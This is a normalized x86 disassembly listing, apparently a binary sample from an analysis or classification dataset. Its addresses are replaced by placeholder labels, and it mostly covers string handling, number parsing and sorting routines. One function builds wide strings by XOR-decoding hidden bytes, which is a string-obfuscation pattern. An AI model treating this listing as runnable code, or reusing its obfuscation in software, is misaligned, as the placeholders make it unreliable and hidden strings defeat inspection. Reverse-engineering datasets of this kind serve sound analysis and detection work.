push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_1007c46b
mov eax [ ebp + 0xc ]
push r--data
call sub_10057cd0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10024145
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_1007c439
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10024145
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_100430c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081259
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] 0x1
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ esi + 0x10 ]
sub eax edx
add eax [ ebx + 0x10 ]
cmp edi eax
ja r-xdata
mov edi [ ebp + 0xc ]
mov eax edi
lea edx [ eax + 0x1 ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
mov ecx esi
call sub_10067f90
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_10035d20
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push eax
mov ecx esi
call sub_100399e0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_10043190
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1002c5ed
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
push edi
mov ecx esi
call sub_10016d10
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
push ebx
push eax
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_100417c0
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_100417c0
pop esi
pop ebx
pop ebp
retn 0x8
sub_10043285
push 0x6c
mov eax sub_1007f7ab
call sub_1001bb6b
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x64 ] eax
mov eax [ ecx + 0x14 ]
mov edx 0x3000
and eax edx
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_10004f60
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x70 ] eax
call sub_10069ce0
mov ecx [ ebp - 0x70 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10051f6c
lea ebx [ edi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] ebx
call sub_1003088d
movzx eax ax
add esp 0xc
push [ ebp - 0x64 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] 0x0
call sub_100081b8
test al al
jne r-xdata
push ebx
push ecx
push [ ebp - 0x64 ]
push esi
push [ ebp - 0x68 ]
push edi
call sub_10021722
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor edi edi
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] edi
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
call sub_1004fa89
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2b
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
push [ ebp - 0x64 ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ebx [ ebp - 0x64 ]
push ebx
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2d
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1005576a
mov edi [ ebp - 0x60 ]
test edi edi
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x38 ] edi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2d
push ebx
mov ecx esi
call sub_100081b8
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x74 ] edi
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push ebx
mov ecx esi
call sub_100081b8
test al al
je r-xdata
call sub_100680bc
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1005576a
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_10006560
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_100081b8
test al al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push ebx
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x60 ] 0x24
jl r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
mov ebx [ ebp - 0x58 ]
cmp bx ax
ja r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ eax ] 0x30
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10041a20
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_10023e65
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_10041a20
mov eax [ ebp - 0x5c ]
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x65
call sub_1003088d
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_10023e65
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
mov ebx [ ebp - 0x58 ]
cmp [ esi + 0x6 ] bx
jne r-xdata
mov ecx esi
call sub_10023e65
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
push [ ebp - 0x64 ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
movzx ecx bx
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10023e65
cmp edi 0x24
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x65
call sub_1005576a
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] edi
je r-xdata
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x74 ] 0x0
je r-xdata
cmp [ ebp - 0x60 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x64 ]
push edi
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x45
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
mov al [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_10023e65
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc edi
mov ecx esi
call sub_10023e65
push edi
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x74 ]
jne r-xdata
mov ecx esi
call sub_10023e65
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc edi
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003f510
inc edi
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
push edi
mov ecx esi
call sub_100081b8
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1005576a
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_10023e65
mov ecx esi
call sub_1005576a
push [ ebp - 0x64 ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_10023e65
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_10023e65
sub_10043930
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_10050437
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_1002c5ed
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_1002c5ed
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_1004d170
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x8
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
xor edx edx
pop esi
mov [ eax ] dx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
lea edx [ ebx + ebx ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
mov edx [ esi + 0x10 ]
push ecx
lea eax [ eax + edx * 2 ]
push eax
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10043a40
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_10057830
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_10043a70
push ebp
mov ebp esp
push 0xffffffff
push sub_10081302
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ebx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ ebp - 0x4 ] 0x1
cmp ebx eax
je r-xdata
mov ecx edi
call sub_1000d680
sub esi eax
mov eax 0x38e38e39
imul esi
sar edx 0x3
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x24
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0xffffffff
push eax
xor edx edx
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] eax
push esi
mov ecx ebx
mov [ ebx ] dx
call sub_10019180
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov ecx [ esi + 0x20 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ edi ]
lea eax [ esi + esi * 8 ]
mov esi [ edi + 0x4 ]
lea ebx [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx edi
call sub_1000d680
push 0xffffffff
push eax
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push ebx
mov ecx esi
mov [ esi ] dx
call sub_10019180
mov eax [ ebx + 0x1c ]
mov [ esi + 0x1c ] eax
mov ecx [ ebx + 0x20 ]
mov [ esi + 0x20 ] ecx
jmp r-xdata
sub_10043b70
push ebp
mov ebp esp
push 0xffffffff
push sub_10082dad
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x114 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x118 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x110 ] eax
movsx eax [ ecx ]
xor eax 0xffd0
xor ecx ecx
and eax 0xff
mov [ ebp - 0x104 ] ax
mov [ ebp - 0x102 ] cx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xffbd
and esi 0xff
mov [ ebp + eax * 2 - 0x20 ] si
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x1c ] ax
xor ecx ecx
mov eax edx
mov [ ebp - 0xb4 ] 0x7
mov [ ebp - 0xb8 ] edi
mov [ ebp - 0xc8 ] cx
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0xc8 ]
call sub_100531b0
lea edx [ ebp - 0xc8 ]
push edx
lea edx [ ebp - 0x104 ]
lea esi [ ebp - 0x100 ]
mov [ ebp - 0x4 ] edi
call sub_10016380
add esp 0x4
push eax
lea edx [ ebp - 0x20 ]
lea esi [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x1
call sub_10030dc0
add esp 0x4
mov ebx 0x8
cmp [ ebp - 0xec ] ebx
jb r-xdata
mov esi 0x7
xor ecx ecx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xf0 ] edi
mov [ ebp - 0x100 ] cx
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0xb4 ] ebx
jb r-xdata
mov eax [ ebp - 0x100 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0xb4 ] esi
mov [ ebp - 0xb8 ] edi
mov [ ebp - 0xc8 ] ax
mov edx [ ebp - 0xc8 ]
push edx
call sub_1006591f
add esp 0x4
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x31
and edx 0xff
mov [ ebp + eax * 2 - 0x58 ] dx
inc eax
cmp eax 0x1a
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x24 ] ax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x74
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x60 ] esi
mov esi [ ebp - 0x114 ]
mov [ ebp - 0x14 ] ax
xor ecx ecx
mov eax esi
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x74 ] cx
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x74 ]
call sub_100531b0
lea edx [ ebp - 0x74 ]
push edx
lea edx [ ebp - 0x58 ]
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x5
call sub_10016380
add esp 0x4
push eax
lea edx [ ebp - 0x18 ]
lea esi [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x6
call sub_10030dc0
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x7
call sub_10043930
cmp [ ebp - 0x98 ] ebx
jb r-xdata
xor ecx ecx
mov esi 0x7
mov [ ebp - 0x98 ] esi
mov [ ebp - 0x9c ] edi
mov [ ebp - 0xac ] cx
cmp [ ebp - 0x7c ] ebx
jb r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x90 ] ax
cmp [ ebp - 0x60 ] ebx
jb r-xdata
mov edx [ ebp - 0x90 ]
push edx
call sub_1006591f
add esp 0x4
mov edx [ r--data ]
movsx eax [ edx ]
mov edx [ r--data ]
xor eax 0xffe2
and eax 0xff
xor ecx ecx
mov [ ebp - 0x108 ] ax
mov [ ebp - 0x106 ] cx
movsx eax [ edx ]
xor eax 0x24
and eax 0xff
mov [ ebp - 0x60 ] esi
mov esi [ ebp - 0x118 ]
xor edx edx
mov [ ebp - 0x10c ] ax
mov eax esi
mov [ ebp - 0x74 ] dx
mov [ ebp - 0x10a ] cx
mov [ ebp - 0x64 ] edi
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
mov ecx [ ebp - 0x74 ]
push ecx
call sub_1006591f
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x74 ]
call sub_100531b0
lea eax [ ebp - 0x74 ]
push eax
lea edx [ ebp - 0x108 ]
lea esi [ ebp - 0xac ]
mov [ ebp - 0x4 ] bl
call sub_10016380
add esp 0x4
push eax
lea edx [ ebp - 0x10c ]
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x9
call sub_10030dc0
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0xa
call sub_10043930
cmp [ ebp - 0x7c ] ebx
jb r-xdata
xor edx edx
mov esi 0x7
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x90 ] dx
cmp [ ebp - 0x98 ] ebx
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0x98 ] esi
mov [ ebp - 0x9c ] edi
mov [ ebp - 0xac ] cx
cmp [ ebp - 0x60 ] ebx
jb r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0xe4 ]
cmp [ ebp - 0xd0 ] ebx
jae r-xdata
mov edx [ ebp - 0x74 ]
push edx
call sub_1006591f
add esp 0x4
mov edx [ ebp - 0x110 ]
call sub_10017560
mov esi eax
cmp [ ebp - 0xd0 ] ebx
jb r-xdata
lea ecx [ ebp - 0xe4 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xe4 ]
push eax
call sub_1006591f
add esp 0x4
sub_10043f7b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_1005f1f6
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1006818d
sub_10043fb0
push ebp
mov ebp esp
sub esp 0x8
mov ecx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
mov eax ecx
sub eax ebx
sar eax 0x2
cdq
push esi
sub eax edx
sar eax 0x1
push edi
lea edi [ ebx + eax * 4 ]
mov eax [ ebp + 0x14 ]
push eax
add ecx 0xfffffffc
push ecx
mov esi ebx
call sub_10031a60
add esp 0x8
lea esi [ edi + 0x4 ]
mov [ ebp - 0x4 ] esi
cmp ebx edi
jae r-xdata
cmp esi [ ebp + 0x10 ]
jae r-xdata
lea ebx [ ebx ]
mov ebx edi
mov edi edi
mov edi edi
mov eax [ edi - 0x4 ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
cmp ebx [ ebp + 0xc ]
jbe r-xdata
mov eax [ esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] esi
mov ecx [ esi ]
mov edx [ edi ]
push ecx
push edx
call ebx
add esp 0x8
test eax eax
jne r-xdata
add edi 0xfffffffc
cmp ebx edi
jb r-xdata
